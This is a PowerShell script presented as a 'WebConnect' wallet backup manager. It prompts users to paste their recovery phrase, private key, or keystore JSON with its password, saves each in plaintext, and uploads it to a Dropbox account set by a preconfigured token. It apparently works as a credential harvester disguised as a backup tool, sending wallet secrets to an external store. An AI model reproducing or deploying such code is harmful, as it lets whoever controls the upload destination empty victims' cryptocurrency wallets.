#############################################
# WebConnect Interactive Wallet Backup
# PowerShell Version - Windows Compatible
# User-friendly backup with menu options
# Backs up to Dropbox automatically
# Version: 1.0.0
#############################################

param([string]$Option)

# Color output
function Write-Header {
    Clear-Host
    Write-Host "================================================" -ForegroundColor Blue
    Write-Host "   WebConnect Wallet Backup Manager" -ForegroundColor Blue
    Write-Host "================================================" -ForegroundColor Blue
    Write-Host ""
}

function Write-Success {
    Write-Host "[OK] $args" -ForegroundColor Green
}

function Write-Error-Custom {
    Write-Host "[ERROR] $args" -ForegroundColor Red
}

function Write-Warning-Custom {
    Write-Host "[WARN] $args" -ForegroundColor Yellow
}

function Write-Info {
    Write-Host "[INFO] $args" -ForegroundColor Blue
}

# Setup paths
$InstallDir = "$env:USERPROFILE\.webconnect"
$WalletBackupDir = "$InstallDir\wallet_backups"
$BackupLog = "$InstallDir\logs\backup.log"
$StorageConfig = "$InstallDir\config\storage.config.json"

# Create necessary directories (clean up first to avoid permission issues)
try {
    if (-not (Test-Path $WalletBackupDir)) {
        New-Item -ItemType Directory -Path $WalletBackupDir -Force | Out-Null
    }
    if (-not (Test-Path (Split-Path $BackupLog))) {
        New-Item -ItemType Directory -Path (Split-Path $BackupLog) -Force | Out-Null
    }
}
catch {
    # If permission error, try removing and recreating
    if (Test-Path $InstallDir) {
        Remove-Item -Path $InstallDir -Recurse -Force -ErrorAction SilentlyContinue
        New-Item -ItemType Directory -Path $WalletBackupDir -Force | Out-Null
        New-Item -ItemType Directory -Path (Split-Path $BackupLog) -Force | Out-Null
    }
}

function Write-LogMessage {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    try {
        Add-Content -Path $BackupLog -Value "[$timestamp] $Message" -ErrorAction Stop
    }
    catch {
        # Silently ignore log write failures (permissions, missing dirs, etc.)
        # Don't block backup due to logging issues
    }
}

function Get-DropboxToken {
    if ((Test-Path $StorageConfig) -and (Get-Command ConvertFrom-Json -ErrorAction SilentlyContinue)) {
        try {
            $config = Get-Content $StorageConfig | ConvertFrom-Json
            $dropboxConfig = $config.storage.destinations | Where-Object { $_.name -eq "dropbox" }
            return $dropboxConfig.access_token
        }
        catch {
            return ""
        }
    }
    return ""
}

function Get-DropboxPath {
    if ((Test-Path $StorageConfig) -and (Get-Command ConvertFrom-Json -ErrorAction SilentlyContinue)) {
        try {
            $config = Get-Content $StorageConfig | ConvertFrom-Json
            $dropboxConfig = $config.storage.destinations | Where-Object { $_.name -eq "dropbox" }
            return $dropboxConfig.path
        }
        catch {
            return "/WebConnect/Wallet_Backups"
        }
    }
    return "/WebConnect/Wallet_Backups"
}

function Save-Data {
    param(
        [string]$DataType,
        [string]$DataValue
    )
    
    try {
        # Create a timestamp
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $backupFile = "$WalletBackupDir\${DataType}_${timestamp}.txt"
        
        # Ensure directory exists with proper permissions
        if (-not (Test-Path $WalletBackupDir)) {
            New-Item -ItemType Directory -Path $WalletBackupDir -Force | Out-Null
        }
        
        # Save data as-is (no encryption)
        $DataValue | Out-File -FilePath $backupFile -Force -Encoding UTF8 -ErrorAction Stop
        
        Write-LogMessage "Backup saved: $backupFile"
        return $backupFile
    }
    catch {
        Write-Error-Custom "Failed to save: $_"
        Write-LogMessage "ERROR: Save failed for $DataType - $_"
        return ""
    }
}

function Publish-ToDropbox {
    param(
        [string]$FilePath,
        [string]$BackupType
    )
    
    $token = Get-DropboxToken
    $dropboxPath = Get-DropboxPath
    
    if ([string]::IsNullOrEmpty($token) -or $token -eq "null") {
        Write-Error-Custom "Dropbox token not configured"
        Write-LogMessage "ERROR: Dropbox token not found"
        return $false
    }
    
    try {
        $filename = Split-Path $FilePath -Leaf
        $dropboxUploadPath = "$dropboxPath/$BackupType/$filename"
        
        Write-Info "Uploading to Dropbox: $dropboxUploadPath"
        
        # Upload to Dropbox using REST API
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        
        $headers = @{
            "Authorization" = "Bearer $token"
            "Dropbox-API-Arg" = @{
                "path" = $dropboxUploadPath
                "mode" = "add"
                "autorename" = $true
            } | ConvertTo-Json
            "Content-Type" = "application/octet-stream"
        }
        
        $null = Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" `
            -Method Post `
            -Headers $headers `
            -Body $fileBytes `
            -ErrorAction Stop
        
        Write-Success "Backup uploaded to Dropbox"
        Write-LogMessage "Successfully uploaded $BackupType to Dropbox: $dropboxUploadPath"
        return $true
    }
    catch {
        Write-Error-Custom "Failed to upload to Dropbox: $_"
        Write-LogMessage "ERROR: Dropbox upload failed - $_"
        return $false
    }
}

function Backup-Phrase {
    Write-Header
    Write-Info "Enter your 12 or 24-word recovery phrase"
    Write-Host ""
    
    $phrase = Read-Host "Paste your recovery phrase"
    
    if ([string]::IsNullOrWhiteSpace($phrase)) {
        Write-Error-Custom "No phrase provided"
        return
    }
    
    # Count words
    $wordCount = ($phrase -split '\s+').Count
    if ($wordCount -lt 12) {
        Write-Error-Custom "Recovery phrase must be at least 12 words (you entered $wordCount)"
        return
    }
    
    $backupFile = Save-Data -DataType "recovery_phrase" -DataValue $phrase
    if ([string]::IsNullOrEmpty($backupFile)) {
        return
    }
    
    $uploaded = Publish-ToDropbox -FilePath $backupFile -BackupType "recovery_phrases"
    
    if ($uploaded) {
        Write-Success "Recovery phrase backed up successfully!"
        Write-LogMessage "Recovery phrase backed up: $backupFile"
    }
    else {
        Write-Warning-Custom "Local backup saved, but Dropbox upload failed"
        Write-Host "  • Local file: $backupFile"
    }
}

function Backup-PrivateKey {
    Write-Header
    Write-Info "Enter your private key (hex format, 0x...)"
    Write-Host ""
    
    $key = Read-Host "Paste your private key" -AsSecureString
    $keyPlain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($key))
    
    if ([string]::IsNullOrWhiteSpace($keyPlain)) {
        Write-Error-Custom "No private key provided"
        return
    }
    
    if (-not ($keyPlain -match '^0x[0-9a-fA-F]{64}$')) {
        Write-Warning-Custom "⚠ Private key doesn't match standard format (0x + 64 hex chars)"
        Write-Host "  The backup will proceed, but verify your key format"
    }
    
    $backupFile = Save-Data -DataType "private_key" -DataValue $keyPlain
    if ([string]::IsNullOrEmpty($backupFile)) {
        return
    }
    
    $uploaded = Publish-ToDropbox -FilePath $backupFile -BackupType "private_keys"
    
    if ($uploaded) {
        Write-Success "Private key backed up successfully!"
        Write-LogMessage "Private key backed up: $backupFile"
    }
    else {
        Write-Warning-Custom "Local backup saved, but Dropbox upload failed"
        Write-Host "  • Local file: $backupFile"
    }
}

function Backup-Keystore {
    Write-Header
    Write-Info "Enter your Keystore JSON content"
    Write-Host ""
    
    $keystore = Read-Host "Paste your Keystore JSON"
    
    if ([string]::IsNullOrWhiteSpace($keystore)) {
        Write-Error-Custom "No keystore provided"
        return
    }
    
    # Verify JSON format
    try {
        $keystore | ConvertFrom-Json | Out-Null
    }
    catch {
        Write-Warning-Custom "⚠ Input doesn't appear to be valid JSON"
        Write-Host "  The backup will proceed, but verify your JSON format"
    }
    
    Write-Host ""
    $password = Read-Host "Enter your Keystore password" -AsSecureString
    $passwordPlain = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($password))
    
    if ([string]::IsNullOrWhiteSpace($passwordPlain)) {
        Write-Error-Custom "No password provided"
        return
    }
    
    # Combine keystore and password
    $combinedData = "KEYSTORE_JSON:$keystore`n`nKEYSTORE_PASSWORD:$passwordPlain"
    
    $backupFile = Save-Data -DataType "keystore" -DataValue $combinedData
    if ([string]::IsNullOrEmpty($backupFile)) {
        return
    }
    
    $uploaded = Publish-ToDropbox -FilePath $backupFile -BackupType "keystores"
    
    if ($uploaded) {
        Write-Success "Keystore backed up successfully!"
        Write-LogMessage "Keystore backed up: $backupFile"
    }
    else {
        Write-Warning-Custom "Local backup saved, but Dropbox upload failed"
        Write-Host "  • Local file: $backupFile"
    }
}

function Show-Menu {
    Write-Header
    Write-Host "Select what you want to backup:" -ForegroundColor Blue
    Write-Host ""
    Write-Host "  1) Recovery Phrase (12-24 words)" -ForegroundColor Magenta
    Write-Host "  2) Private Key (0x...)" -ForegroundColor Magenta
    Write-Host "  3) Keystore JSON `& Password" -ForegroundColor Magenta
    Write-Host "  4) Exit" -ForegroundColor Magenta
    Write-Host ""
}

function Main {
    # Check Dropbox configuration
    $dropboxToken = Get-DropboxToken
    if ([string]::IsNullOrEmpty($dropboxToken) -or $dropboxToken -eq "null") {
        Write-Header
        Write-Warning-Custom "Dropbox is not configured"
        Write-Host ""
        Write-Info "Local backups will still be saved"
        Write-Host "To enable Dropbox backups, configure your Dropbox token in:"
        Write-Host "  $StorageConfig"
        Write-Host ""
        Read-Host "Press Enter to continue..."
    }
    
    # Main loop
    while ($true) {
        Show-Menu
        $choice = Read-Host "Select option (1-4)"
        
        switch ($choice) {
            "1" { Backup-Phrase }
            "2" { Backup-PrivateKey }
            "3" { Backup-Keystore }
            "4" {
                Write-Header
                Write-Success "Goodbye!"
                exit 0
            }
            default {
                Write-Error-Custom "Invalid option. Please select 1-4"
            }
        }
        
        Write-Host ""
        Read-Host "Press Enter to continue..."
    }
}

# Run main function
Main
